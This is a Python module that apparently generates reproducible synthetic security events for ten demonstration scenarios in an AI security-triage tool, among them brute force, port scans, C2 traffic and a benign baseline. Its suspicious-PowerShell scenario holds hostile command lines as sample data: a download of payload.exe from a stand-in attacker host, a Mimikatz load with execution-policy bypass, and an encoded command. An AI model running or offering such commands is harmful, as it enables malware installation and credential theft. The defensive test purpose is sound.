"""
SENTINEL AI — Deterministic synthetic event generator.

Generates reproducible security events from a fixed seed.
Covers all 10 demonstration scenarios from the spec (Appendix B).
Every event uses the canonical SecurityEvent model.
"""

from __future__ import annotations

import hashlib
import random
from datetime import UTC, datetime, timedelta

from backend.app.domain.events import (
    AgentFields,
    DataMode,
    DestinationFields,
    EventCategory,
    EventFields,
    EventKind,
    EventOutcome,
    EventSeverity,
    FileFields,
    FileHash,
    HostFields,
    HostOS,
    NetworkFields,
    ObserverFields,
    ProcessFields,
    RuleFields,
    SecurityEvent,
    SentinelMetadata,
    SentinelSource,
    SourceFields,
    UserFields,
)

# Fixed seed for reproducibility
DEFAULT_SEED = 42

# Synthetic infrastructure
HOSTS = [
    {"name": "web-server-01", "id": "h-001", "os": "Ubuntu 22.04"},
    {"name": "db-server-01", "id": "h-002", "os": "Ubuntu 22.04"},
    {"name": "workstation-01", "id": "h-003", "os": "Windows 11"},
    {"name": "workstation-02", "id": "h-004", "os": "Windows 11"},
    {"name": "dc-01", "id": "h-005", "os": "Windows Server 2022"},
    {"name": "mail-server-01", "id": "h-006", "os": "Ubuntu 22.04"},
    {"name": "fileserver-01", "id": "h-007", "os": "Windows Server 2022"},
]

USERS = [
    {"name": "admin", "id": "u-001"},
    {"name": "jsmith", "id": "u-002"},
    {"name": "agarcia", "id": "u-003"},
    {"name": "bwilson", "id": "u-004"},
    {"name": "cjones", "id": "u-005"},
    {"name": "root", "id": "u-006"},
    {"name": "svc_backup", "id": "u-007"},
    {"name": "dkumar", "id": "u-008"},
]

ATTACKER_IPS = ["192.168.1.100", "10.0.0.55", "203.0.113.42", "198.51.100.17"]
INTERNAL_IPS = ["192.168.1.10", "192.168.1.20", "192.168.1.30", "10.0.0.5", "10.0.0.10"]
EXTERNAL_IPS = ["203.0.113.42", "198.51.100.17", "192.0.2.88", "203.0.113.99"]
C2_IPS = ["198.51.100.77", "203.0.113.13"]


def _make_event_id(scenario: str, index: int) -> str:
    """Create a deterministic event ID from scenario name and index."""
    raw = f"{scenario}:{index}"
    return f"evt-{hashlib.sha256(raw.encode()).hexdigest()[:16]}"


def _make_sentinel_meta(provider: str = "synthetic", doc_id: str | None = None) -> SentinelMetadata:
    return SentinelMetadata(
        source=SentinelSource(
            provider=provider,
            index="synthetic-events",
            document_id=doc_id,
        ),
        data_mode=DataMode.SYNTHETIC,
    )


class SyntheticEventGenerator:
    """
    Generates deterministic, reproducible security events from a fixed seed.

    Covers all 10 demonstration scenarios from Appendix B:
    1. SSH brute force without successful login
    2. SSH brute force followed by successful login
    3. Repeated failures across multiple accounts from one source
    4. Suspicious PowerShell execution
    5. Possible privilege escalation after login
    6. File-integrity modification
    7. Port scan followed by a connection attempt
    8. Suspicious outbound communication
    9. Malware alert with host and rule metadata
    10. Benign activity that should not be escalated
    """

    def __init__(self, seed: int = DEFAULT_SEED, base_time: datetime | None = None) -> None:
        self._seed = seed
        self._rng = random.Random(seed)
        self._base_time = base_time or datetime(2026, 11, 16, 0, 0, 0, tzinfo=UTC)
        self._events: list[SecurityEvent] = []
        self._generated = False

    def generate_all(self) -> list[SecurityEvent]:
        """Generate all scenario events. Idempotent — returns cached results."""
        if self._generated:
            return self._events

        self._rng = random.Random(self._seed)
        self._events = []

        self._scenario_1_ssh_brute_no_success()
        self._scenario_2_ssh_brute_then_success()
        self._scenario_3_multi_account_failures()
        self._scenario_4_suspicious_powershell()
        self._scenario_5_privilege_escalation()
        self._scenario_6_file_integrity()
        self._scenario_7_port_scan()
        self._scenario_8_suspicious_outbound()
        self._scenario_9_malware_alert()
        self._scenario_10_benign_activity()

        self._generated = True
        return self._events

    def _ts(self, hours_offset: float = 0, minutes_offset: float = 0) -> datetime:
        """Generate a timestamp relative to base_time."""
        return self._base_time + timedelta(hours=hours_offset, minutes=minutes_offset)

    def _add(self, event: SecurityEvent) -> None:
        self._events.append(event)

    # ---- Scenario 1: SSH brute force without successful login ----

    def _scenario_1_ssh_brute_no_success(self) -> None:
        """20 failed SSH logins from attacker IP to web-server-01, no success."""
        attacker_ip = ATTACKER_IPS[0]  # 192.168.1.100
        target_host = HOSTS[0]  # web-server-01
        target_user = USERS[5]  # root

        for i in range(20):
            eid = _make_event_id("s1_ssh_brute", i)
            self._add(
                SecurityEvent(
                    **{"@timestamp": self._ts(hours_offset=-23, minutes_offset=i * 2)},
                    event=EventFields(
                        id=eid,
                        kind=EventKind.EVENT,
                        category=EventCategory.AUTHENTICATION,
                        type="start",
                        action="ssh_login",
                        outcome=EventOutcome.FAILURE,
                        severity=EventSeverity.MEDIUM,
                        created=self._ts(hours_offset=-23, minutes_offset=i * 2),
                    ),
                    message=f"Failed SSH login for user {target_user['name']} from {attacker_ip}",
                    source=SourceFields(ip=attacker_ip, port=self._rng.randint(40000, 65000)),
                    destination=DestinationFields(ip=INTERNAL_IPS[0], port=22),
                    user=UserFields(**target_user),
                    host=HostFields(
                        name=target_host["name"],
                        id=target_host["id"],
                        os=HostOS(name=target_host["os"]),
                    ),
                    network=NetworkFields(protocol="ssh"),
                    observer=ObserverFields(name="wazuh-agent-001"),
                    sentinel=_make_sentinel_meta(doc_id=eid),
                )
            )

    # ---- Scenario 2: SSH brute force followed by successful login ----

    def _scenario_2_ssh_brute_then_success(self) -> None:
        """15 failed SSH logins then 1 success from same attacker to db-server-01."""
        attacker_ip = ATTACKER_IPS[1]  # 10.0.0.55
        target_host = HOSTS[1]  # db-server-01
        target_user = USERS[1]  # jsmith

        for i in range(15):
            eid = _make_event_id("s2_ssh_brute_fail", i)
            self._add(
                SecurityEvent(
                    **{"@timestamp": self._ts(hours_offset=-12, minutes_offset=i * 1)},
                    event=EventFields(
                        id=eid,
                        kind=EventKind.EVENT,
                        category=EventCategory.AUTHENTICATION,
                        type="start",
                        action="ssh_login",
                        outcome=EventOutcome.FAILURE,
                        severity=EventSeverity.MEDIUM,
                        created=self._ts(hours_offset=-12, minutes_offset=i * 1),
                    ),
                    message=f"Failed SSH login for user {target_user['name']} from {attacker_ip}",
                    source=SourceFields(ip=attacker_ip, port=self._rng.randint(40000, 65000)),
                    destination=DestinationFields(ip=INTERNAL_IPS[1], port=22),
                    user=UserFields(**target_user),
                    host=HostFields(
                        name=target_host["name"],
                        id=target_host["id"],
                        os=HostOS(name=target_host["os"]),
                    ),
                    network=NetworkFields(protocol="ssh"),
                    observer=ObserverFields(name="wazuh-agent-002"),
                    sentinel=_make_sentinel_meta(doc_id=eid),
                )
            )

        # Successful login after failures
        eid = _make_event_id("s2_ssh_brute_success", 0)
        self._add(
            SecurityEvent(
                **{"@timestamp": self._ts(hours_offset=-12, minutes_offset=16)},
                event=EventFields(
                    id=eid,
                    kind=EventKind.EVENT,
                    category=EventCategory.AUTHENTICATION,
                    type="start",
                    action="ssh_login",
                    outcome=EventOutcome.SUCCESS,
                    severity=EventSeverity.HIGH,
                    created=self._ts(hours_offset=-12, minutes_offset=16),
                ),
                message=(
                    f"Successful SSH login for user {target_user['name']} "
                    f"from {attacker_ip} (after brute-force attempts)"
                ),
                source=SourceFields(ip=attacker_ip, port=self._rng.randint(40000, 65000)),
                destination=DestinationFields(ip=INTERNAL_IPS[1], port=22),
                user=UserFields(**target_user),
                host=HostFields(
                    name=target_host["name"],
                    id=target_host["id"],
                    os=HostOS(name=target_host["os"]),
                ),
                network=NetworkFields(protocol="ssh"),
                observer=ObserverFields(name="wazuh-agent-002"),
                sentinel=_make_sentinel_meta(doc_id=eid),
            )
        )

    # ---- Scenario 3: Repeated failures across multiple accounts from one source ----

    def _scenario_3_multi_account_failures(self) -> None:
        """One attacker IP targets 5 different accounts on dc-01."""
        attacker_ip = ATTACKER_IPS[2]  # 203.0.113.42
        target_host = HOSTS[4]  # dc-01
        target_users = USERS[:5]

        for u_idx, user in enumerate(target_users):
            for i in range(6):
                eid = _make_event_id(f"s3_multi_acct_{user['name']}", i)
                self._add(
                    SecurityEvent(
                        **{"@timestamp": self._ts(hours_offset=-8, minutes_offset=u_idx * 10 + i)},
                        event=EventFields(
                            id=eid,
                            kind=EventKind.EVENT,
                            category=EventCategory.AUTHENTICATION,
                            type="start",
                            action="windows_login",
                            outcome=EventOutcome.FAILURE,
                            severity=EventSeverity.MEDIUM,
                            created=self._ts(hours_offset=-8, minutes_offset=u_idx * 10 + i),
                        ),
                        message=f"Failed Windows logon for {user['name']} from {attacker_ip}",
                        source=SourceFields(ip=attacker_ip, port=self._rng.randint(40000, 65000)),
                        destination=DestinationFields(ip=INTERNAL_IPS[4], port=445),
                        user=UserFields(**user),
                        host=HostFields(
                            name=target_host["name"],
                            id=target_host["id"],
                            os=HostOS(name=target_host["os"]),
                        ),
                        network=NetworkFields(protocol="smb"),
                        observer=ObserverFields(name="wazuh-agent-005"),
                        sentinel=_make_sentinel_meta(doc_id=eid),
                    )
                )

    # ---- Scenario 4: Suspicious PowerShell execution ----

    def _scenario_4_suspicious_powershell(self) -> None:
        """Suspicious PowerShell commands on workstation-01."""
        target_host = HOSTS[2]  # workstation-01
        user = USERS[3]  # bwilson

        suspicious_commands = [
            "powershell.exe -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0...",
            "powershell.exe -ep bypass -c Import-Module Invoke-Mimikatz",
            "powershell.exe -c (New-Object Net.WebClient).DownloadFile('http://evil.example.com/payload.exe','C:\\temp\\svc.exe')",
        ]

        for i, cmd in enumerate(suspicious_commands):
            eid = _make_event_id("s4_powershell", i)
            self._add(
                SecurityEvent(
                    **{"@timestamp": self._ts(hours_offset=-6, minutes_offset=i * 5)},
                    event=EventFields(
                        id=eid,
                        kind=EventKind.ALERT,
                        category=EventCategory.PROCESS,
                        type="start",
                        action="process_created",
                        outcome=EventOutcome.SUCCESS,
                        severity=EventSeverity.HIGH,
                        created=self._ts(hours_offset=-6, minutes_offset=i * 5),
                    ),
                    message=f"Suspicious PowerShell execution detected: {cmd[:80]}",
                    source=SourceFields(ip=INTERNAL_IPS[2]),
                    user=UserFields(**user),
                    host=HostFields(
                        name=target_host["name"],
                        id=target_host["id"],
                        os=HostOS(name=target_host["os"]),
                    ),
                    process=ProcessFields(
                        name="powershell.exe",
                        command_line=cmd,
                        pid=self._rng.randint(1000, 9999),
                    ),
                    rule=RuleFields(id="92000", name="Suspicious PowerShell Execution"),
                    observer=ObserverFields(name="wazuh-agent-003"),
                    sentinel=_make_sentinel_meta(doc_id=eid),
                )
            )

    # ---- Scenario 5: Possible privilege escalation after login ----

    def _scenario_5_privilege_escalation(self) -> None:
        """Successful login followed by admin group addition on dc-01."""
        target_host = HOSTS[4]  # dc-01
        user = USERS[2]  # agarcia

        # Successful login
        eid_login = _make_event_id("s5_priv_esc_login", 0)
        self._add(
            SecurityEvent(
                **{"@timestamp": self._ts(hours_offset=-5, minutes_offset=0)},
                event=EventFields(
                    id=eid_login,
                    kind=EventKind.EVENT,
                    category=EventCategory.AUTHENTICATION,
                    type="start",
                    action="windows_login",
                    outcome=EventOutcome.SUCCESS,
                    severity=EventSeverity.LOW,
                    created=self._ts(hours_offset=-5, minutes_offset=0),
                ),
                message=f"Successful Windows logon for {user['name']}",
                source=SourceFields(ip=INTERNAL_IPS[2]),
                destination=DestinationFields(ip=INTERNAL_IPS[4], port=3389),
                user=UserFields(**user),
                host=HostFields(
                    name=target_host["name"],
                    id=target_host["id"],
                    os=HostOS(name=target_host["os"]),
                ),
                observer=ObserverFields(name="wazuh-agent-005"),
                sentinel=_make_sentinel_meta(doc_id=eid_login),
            )
        )

        # Privilege escalation: adding to admin group
        eid_priv = _make_event_id("s5_priv_esc_add_admin", 0)
        self._add(
            SecurityEvent(
                **{"@timestamp": self._ts(hours_offset=-5, minutes_offset=3)},
                event=EventFields(
                    id=eid_priv,
                    kind=EventKind.ALERT,
                    category=EventCategory.IAM,
                    type="change",
                    action="group_membership_add",
                    outcome=EventOutcome.SUCCESS,
                    severity=EventSeverity.CRITICAL,
                    created=self._ts(hours_offset=-5, minutes_offset=3),
                ),
                message=(
                    f"User {user['name']} added to Administrators group "
                    f"on {target_host['name']}"
                ),
                source=SourceFields(ip=INTERNAL_IPS[2]),
                user=UserFields(**user),
                host=HostFields(
                    name=target_host["name"],
                    id=target_host["id"],
                    os=HostOS(name=target_host["os"]),
                ),
                rule=RuleFields(id="5560", name="User Added to Admin Group"),
                observer=ObserverFields(name="wazuh-agent-005"),
                sentinel=_make_sentinel_meta(doc_id=eid_priv),
            )
        )

    # ---- Scenario 6: File-integrity modification ----

    def _scenario_6_file_integrity(self) -> None:
        """File integrity changes on fileserver-01."""
        target_host = HOSTS[6]  # fileserver-01

        files = [
            "/etc/passwd",
            "/etc/shadow",
            "C:\\Windows\\System32\\config\\SAM",
        ]

        for i, fpath in enumerate(files):
            eid = _make_event_id("s6_fim", i)
            fake_hash = hashlib.sha256(f"fim:{fpath}:{i}".encode()).hexdigest()
            self._add(
                SecurityEvent(
                    **{"@timestamp": self._ts(hours_offset=-4, minutes_offset=i * 10)},
                    event=EventFields(
                        id=eid,
                        kind=EventKind.ALERT,
                        category=EventCategory.FILE,
                        type="change",
                        action="file_modified",
                        outcome=EventOutcome.UNKNOWN,
                        severity=EventSeverity.HIGH,
                        created=self._ts(hours_offset=-4, minutes_offset=i * 10),
                    ),
                    message=f"File integrity change detected: {fpath}",
                    host=HostFields(
                        name=target_host["name"],
                        id=target_host["id"],
                        os=HostOS(name=target_host["os"]),
                    ),
                    file=FileFields(
                        path=fpath,
                        hash=FileHash(sha256=fake_hash),
                    ),
                    rule=RuleFields(id="550", name="File Integrity Monitoring"),
                    observer=ObserverFields(name="wazuh-agent-007"),
                    sentinel=_make_sentinel_meta(doc_id=eid),
                )
            )

    # ---- Scenario 7: Port scan followed by connection attempt ----

    def _scenario_7_port_scan(self) -> None:
        """Port scan from external IP, then connection to SSH on web-server-01."""
        scanner_ip = EXTERNAL_IPS[2]  # 192.0.2.88
        target_host = HOSTS[0]  # web-server-01

        scanned_ports = [21, 22, 23, 80, 443, 445, 3306, 3389, 5432, 8080]

        for i, port in enumerate(scanned_ports):
            eid = _make_event_id("s7_portscan", i)
            self._add(
                SecurityEvent(
                    **{"@timestamp": self._ts(hours_offset=-3, minutes_offset=i)},
                    event=EventFields(
                        id=eid,
                        kind=EventKind.ALERT,
                        category=EventCategory.NETWORK,
                        type="connection",
                        action="port_scan",
                        outcome=EventOutcome.UNKNOWN,
                        severity=EventSeverity.MEDIUM,
                        created=self._ts(hours_offset=-3, minutes_offset=i),
                    ),
                    message=f"Port scan detected from {scanner_ip} to port {port}",
                    source=SourceFields(ip=scanner_ip, port=self._rng.randint(40000, 65000)),
                    destination=DestinationFields(ip=INTERNAL_IPS[0], port=port),
                    host=HostFields(
                        name=target_host["name"],
                        id=target_host["id"],
                        os=HostOS(name=target_host["os"]),
                    ),
                    network=NetworkFields(protocol="tcp"),
                    rule=RuleFields(id="87700", name="Port Scan Detected"),
                    observer=ObserverFields(name="wazuh-agent-001"),
                    sentinel=_make_sentinel_meta(doc_id=eid),
                )
            )

        # Connection attempt to SSH after scan
        eid_conn = _make_event_id("s7_portscan_connect", 0)
        self._add(
            SecurityEvent(
                **{"@timestamp": self._ts(hours_offset=-3, minutes_offset=15)},
                event=EventFields(
                    id=eid_conn,
                    kind=EventKind.EVENT,
                    category=EventCategory.NETWORK,
                    type="connection",
                    action="connection_attempt",
                    outcome=EventOutcome.SUCCESS,
                    severity=EventSeverity.HIGH,
                    created=self._ts(hours_offset=-3, minutes_offset=15),
                ),
                message=f"Connection established from {scanner_ip} to SSH after port scan",
                source=SourceFields(ip=scanner_ip, port=self._rng.randint(40000, 65000)),
                destination=DestinationFields(ip=INTERNAL_IPS[0], port=22),
                host=HostFields(
                    name=target_host["name"],
                    id=target_host["id"],
                    os=HostOS(name=target_host["os"]),
                ),
                network=NetworkFields(protocol="ssh"),
                observer=ObserverFields(name="wazuh-agent-001"),
                sentinel=_make_sentinel_meta(doc_id=eid_conn),
            )
        )

    # ---- Scenario 8: Suspicious outbound communication ----

    def _scenario_8_suspicious_outbound(self) -> None:
        """Outbound connection to known C2 IP from workstation-02."""
        target_host = HOSTS[3]  # workstation-02
        user = USERS[4]  # cjones
        c2_ip = C2_IPS[0]  # 198.51.100.77

        for i in range(3):
            eid = _make_event_id("s8_c2_outbound", i)
            self._add(
                SecurityEvent(
                    **{"@timestamp": self._ts(hours_offset=-2, minutes_offset=i * 30)},
                    event=EventFields(
                        id=eid,
                        kind=EventKind.ALERT,
                        category=EventCategory.NETWORK,
                        type="connection",
                        action="outbound_connection",
                        outcome=EventOutcome.SUCCESS,
                        severity=EventSeverity.CRITICAL,
                        created=self._ts(hours_offset=-2, minutes_offset=i * 30),
                    ),
                    message=f"Suspicious outbound connection to {c2_ip} from {target_host['name']}",
                    source=SourceFields(ip=INTERNAL_IPS[3], port=self._rng.randint(40000, 65000)),
                    destination=DestinationFields(ip=c2_ip, port=443),
                    user=UserFields(**user),
                    host=HostFields(
                        name=target_host["name"],
                        id=target_host["id"],
                        os=HostOS(name=target_host["os"]),
                    ),
                    network=NetworkFields(protocol="https"),
                    rule=RuleFields(id="100100", name="Suspicious Outbound Connection"),
                    observer=ObserverFields(name="wazuh-agent-004"),
                    sentinel=_make_sentinel_meta(doc_id=eid),
                )
            )

    # ---- Scenario 9: Malware alert with host and rule metadata ----

    def _scenario_9_malware_alert(self) -> None:
        """Malware detected on workstation-01."""
        target_host = HOSTS[2]  # workstation-01
        user = USERS[3]  # bwilson

        eid = _make_event_id("s9_malware", 0)
        malware_hash = hashlib.sha256(b"synthetic_malware_sample").hexdigest()

        self._add(
            SecurityEvent(
                **{"@timestamp": self._ts(hours_offset=-1, minutes_offset=0)},
                event=EventFields(
                    id=eid,
                    kind=EventKind.ALERT,
                    category=EventCategory.MALWARE,
                    type="info",
                    action="malware_detected",
                    outcome=EventOutcome.SUCCESS,
                    severity=EventSeverity.CRITICAL,
                    created=self._ts(hours_offset=-1, minutes_offset=0),
                ),
                message=(
                    "Malware detected: Trojan.GenericKD.46789 in "
                    "C:\\Users\\bwilson\\Downloads\\update.exe"
                ),
                source=SourceFields(ip=INTERNAL_IPS[2]),
                user=UserFields(**user),
                host=HostFields(
                    name=target_host["name"],
                    id=target_host["id"],
                    os=HostOS(name=target_host["os"]),
                ),
                process=ProcessFields(
                    name="update.exe",
                    command_line="C:\\Users\\bwilson\\Downloads\\update.exe",
                    pid=4567,
                ),
                file=FileFields(
                    path="C:\\Users\\bwilson\\Downloads\\update.exe",
                    hash=FileHash(sha256=malware_hash),
                ),
                rule=RuleFields(id="87105", name="Malware Detected"),
                agent=AgentFields(id="agent-003", name="wazuh-agent-003"),
                observer=ObserverFields(name="wazuh-agent-003"),
                sentinel=_make_sentinel_meta(doc_id=eid),
            )
        )

    # ---- Scenario 10: Benign activity that should not be escalated ----

    def _scenario_10_benign_activity(self) -> None:
        """Normal login activity, routine file access, scheduled tasks."""
        # Normal successful logins
        benign_users = [USERS[1], USERS[2], USERS[7]]  # jsmith, agarcia, dkumar
        benign_hosts = [HOSTS[2], HOSTS[3], HOSTS[5]]  # workstations + mail

        for i, (user, host) in enumerate(zip(benign_users, benign_hosts)):
            eid = _make_event_id("s10_benign_login", i)
            self._add(
                SecurityEvent(
                    **{"@timestamp": self._ts(hours_offset=-10, minutes_offset=i * 60)},
                    event=EventFields(
                        id=eid,
                        kind=EventKind.EVENT,
                        category=EventCategory.AUTHENTICATION,
                        type="start",
                        action="windows_login",
                        outcome=EventOutcome.SUCCESS,
                        severity=EventSeverity.INFORMATIONAL,
                        created=self._ts(hours_offset=-10, minutes_offset=i * 60),
                    ),
                    message=f"Successful login for {user['name']} on {host['name']}",
                    source=SourceFields(ip=INTERNAL_IPS[i]),
                    user=UserFields(**user),
                    host=HostFields(
                        name=host["name"],
                        id=host["id"],
                        os=HostOS(name=host["os"]),
                    ),
                    observer=ObserverFields(name=f"wazuh-agent-{host['id'][-3:]}"),
                    sentinel=_make_sentinel_meta(doc_id=eid),
                )
            )

        # Routine scheduled task
        eid_sched = _make_event_id("s10_benign_task", 0)
        self._add(
            SecurityEvent(
                **{"@timestamp": self._ts(hours_offset=-6, minutes_offset=30)},
                event=EventFields(
                    id=eid_sched,
                    kind=EventKind.EVENT,
                    category=EventCategory.PROCESS,
                    type="start",
                    action="process_created",
                    outcome=EventOutcome.SUCCESS,
                    severity=EventSeverity.INFORMATIONAL,
                    created=self._ts(hours_offset=-6, minutes_offset=30),
                ),
                message="Scheduled backup task executed: svc_backup running backup.sh",
                user=UserFields(**USERS[6]),  # svc_backup
                host=HostFields(
                    name=HOSTS[1]["name"],
                    id=HOSTS[1]["id"],
                    os=HostOS(name=HOSTS[1]["os"]),
                ),
                process=ProcessFields(
                    name="backup.sh",
                    command_line="/opt/scripts/backup.sh --full",
                    pid=12345,
                ),
                observer=ObserverFields(name="wazuh-agent-002"),
                sentinel=_make_sentinel_meta(doc_id=eid_sched),
            )
        )

        # Normal DNS query (benign network)
        eid_dns = _make_event_id("s10_benign_dns", 0)
        self._add(
            SecurityEvent(
                **{"@timestamp": self._ts(hours_offset=-7, minutes_offset=15)},
                event=EventFields(
                    id=eid_dns,
                    kind=EventKind.EVENT,
                    category=EventCategory.NETWORK,
                    type="connection",
                    action="dns_query",
                    outcome=EventOutcome.SUCCESS,
                    severity=EventSeverity.INFORMATIONAL,
                    created=self._ts(hours_offset=-7, minutes_offset=15),
                ),
                message="DNS query for updates.microsoft.com from workstation-01",
                source=SourceFields(ip=INTERNAL_IPS[2], port=54321),
                destination=DestinationFields(ip="8.8.8.8", port=53),
                host=HostFields(
                    name=HOSTS[2]["name"],
                    id=HOSTS[2]["id"],
                    os=HostOS(name=HOSTS[2]["os"]),
                ),
                network=NetworkFields(protocol="dns"),
                observer=ObserverFields(name="wazuh-agent-003"),
                sentinel=_make_sentinel_meta(doc_id=eid_dns),
            )
        )
